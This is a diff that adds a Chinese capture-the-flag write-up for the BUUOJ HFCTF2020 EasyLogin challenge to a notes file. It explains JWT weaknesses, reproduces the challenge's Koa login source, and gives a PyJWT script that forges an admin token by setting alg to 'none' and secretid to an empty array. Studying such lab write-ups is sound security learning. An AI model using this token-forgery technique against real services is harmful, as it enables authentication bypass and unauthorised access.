@@ -6502,9 +6502,199 @@ for j in range(1, 20):
 FLAG：flag{be45f1f6-fd8a-4922-a605-1086aa8236cb}
 ```
 
+## BUUOJ [HFCTF2020]EasyLogin
 
+### 1. JWT伪造
 
+JWT就长这个样：`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MiwidXNlcm5hbWUiOiJyb290MSIsInBhc3N3b3JkIjoicm9vdDEiLCJpYXQiOjE3MDgzMzA2ODJ9.1dnfM2ojsdQ66MCfKZdzN6OcyIEn9CMkqpNMhLPmVi0`
 
+解码得：
+
+```
+{
+  "header": {
+    "alg": "HS256",
+    "typ": "JWT"
+  },
+  "payload": {
+    "secretid": 2,
+    "username": "root1",
+    "password": "root1",
+    "iat": 1708330682
+  }
+}
+```
+
+分为三部分：`Header.Payload.Signature`
+
+**原理：**首先，跟所有的Session一样，服务器内部自己会有一串密钥，然后当它们收到一段JWT后，首先会查看`alg`拿到对应的Hash算法，然后将第一段和第二段拼接起来，再加上服务器的密钥做哈希算法，得到的结果拿去和`Signature`做比较，一致则通过！
+
+**漏洞：**
+
+1. 由于JWT的内容是可以直接被解码看到的，所以可能会出现信息泄露的问题
+2. 由于`alg`标出了哈希算法，那么如果在密钥过短的前提下，密钥是可以被爆破出来的
+3. **如果`alg`被设置为none，那么服务器将不会再做哈希验证，从而直接通过**
+
+### 2. 解题
+
+打开题目,给了个登录框
+
+ ![img](CTF.assets/f68c8bc338b54d259530464bacea537f.jpeg)
+
+ 没发现什么可以利用的，查看源代码，点击康康
+
+![img](CTF.assets/50c878b0ca9e4077aba7c74f4ee56b35.png)
+
+ 分析可知，该题采用了koa框架，在getflag函数里发现有个/api/flag，应该是有返回flag的函数。
+
+接着的话先附上koa项目的文件框架：
+
+![img](CTF.assets/9bdbaa65afb64c2aadf25758ee781e4d.png)
+
+ 按照koa框架的常见结构去获取下控制器文件的源码。
+
+`/controllers/api.js`
+访问得到整个题目的源代码：
+
+```javascript
+const crypto = require('crypto');
+const fs = require('fs')
+const jwt = require('jsonwebtoken')
+ 
+const APIError = require('../rest').APIError;
+ 
+module.exports = {
+    'POST /api/register': async (ctx, next) => {
+        const {username, password} = ctx.request.body;
+ 
+        if(!username || username === 'admin'){
+            throw new APIError('register error', 'wrong username');
+        }
+ 
+        if(global.secrets.length > 100000) {
+            global.secrets = [];
+        }
+ 
+        const secret = crypto.randomBytes(18).toString('hex');
+        const secretid = global.secrets.length;
+        global.secrets.push(secret)
+ 
+        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});
+ 
+        ctx.rest({
+            token: token
+        });
+ 
+        await next();
+    },
+ 
+    'POST /api/login': async (ctx, next) => {
+        const {username, password} = ctx.request.body;
+ 
+        if(!username || !password) {
+            throw new APIError('login error', 'username or password is necessary');
+        }
+ 
+        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;
+ 
+        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;
+ 
+        console.log(sid)
+ 
+        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {
+            throw new APIError('login error', 'no such secret id');
+        }
+ 
+        const secret = global.secrets[sid];
+ 
+        const user = jwt.verify(token, secret, {algorithm: 'HS256'});
+ 
+        const status = username === user.username && password === user.password;
+ 
+        if(status) {
+            ctx.session.username = username;
+        }
+ 
+        ctx.rest({
+            status
+        });
+ 
+        await next();
+    },
+ 
+    'GET /api/flag': async (ctx, next) => {
+        if(ctx.session.username !== 'admin'){
+            throw new APIError('permission error', 'permission denied');
+        }
+ 
+        const flag = fs.readFileSync('/flag').toString();
+        ctx.rest({
+            flag
+        });
+ 
+        await next();
+    },
+ 
+    'GET /api/logout': async (ctx, next) => {
+        ctx.session.username = null;
+        ctx.rest({
+            status: true
+        })
+        await next();
+    }
+};
+```
+
+重点看看这两个函数，一个是生成jwt的，另一个是返回flag的。
+
+![img](CTF.assets/4830784a30874562824246240d7ca862.png)
+
+ 注意到/apu/flag路径校验为admin用户时才会返回flag，而登录验证方式采用的是JWT，所以可以尝试对JWT进行破解修改。，并且生成JWT是用HS256加密，可以把它改为none来进行破解。标题中的alg字段更改为none，有些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。 此外对于本题中验证采用的密匙secret值也需要为空或者undefined否则还是会触发验证，所以将JWT中secretid项修改为[]。
+
+综上所述，一共要修改三个地方：
+
+> 第一个是username，修改为admin
+>
+> ​	/api/flag 路由中要求 username 必须是admin
+>
+> 第二个是alog，修改为none
+>
+> ​	哈希算法修改为none，那么服务器将不会再做哈希验证从而直接放行
+>
+> 第三个是secretid，修改为[]
+>
+> ​	secretid被用作索引号，以从数组中获取密钥 const secret = global.secrets[sid]; ，那么给定是[]的话将拿不到密钥，相当于将密钥设置为undefined
+
+下面是修改前后这些值的注意事项：
+首先，要获取自己的jwt值，需要用burpsuite登录抓包，如下图：
+
+![img](CTF.assets/3dac854d09f04f1bb79bbc3ebc28736e.png)
+
+ 然后复制authorization后面的内容，也就是你自己的jwt，放到JSON Web Tokens - jwt.io，查看各个值：
+
+![img](CTF.assets/cba69592c16246149d80694fc79e5e7f.png)
+
+ 按照刚刚要修改的三个值修改，由于要修改alg为none，在网页上无法直接获取新的jwt，所以用python脚本生成，在此之前先用pip安装好生成jwt的库：PyJWT库。
+
+脚本如下：
+
+ 值得注意的是这里的iat，是要用你自己在burpsuite里拿到的jwt里的iat值。运行得到新的jwt值。
+
+```python
+import jwt
+token = jwt.encode(
+{
+  "secretid": [],
+  "username": "admin",
+  "password": "123456",
+  "iat": 1662825424
+},
+algorithm="none",key="").encode(encoding='utf-8')
+```
+
+![image-20240219163741866](CTF.assets/image-20240219163741866.png)
+
+ 确定username为admin，且jwt为新生成的jwt后，放包，回到浏览器，访问`/api/flag`拿到flag：
 
 # Misc
 
